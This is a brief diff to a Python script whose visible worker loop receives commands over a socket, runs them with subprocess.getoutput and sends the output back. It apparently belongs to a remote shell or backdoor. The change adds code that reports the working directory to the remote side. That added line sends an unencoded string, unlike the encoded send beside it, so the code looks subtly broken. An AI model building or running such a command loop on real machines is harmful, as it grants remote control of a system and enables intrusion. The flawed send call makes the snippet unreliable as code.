@@ -1,3 +1,4 @@
+import os
 import time
 import socket 
 import threading
@@ -32,6 +33,7 @@ def worker():
 
         output = subprocess.getoutput(command)
         s.send(output.encode())
+        s.send("cwd="+os.getcwd())
 
     print("Connection Closed")
     s.close()
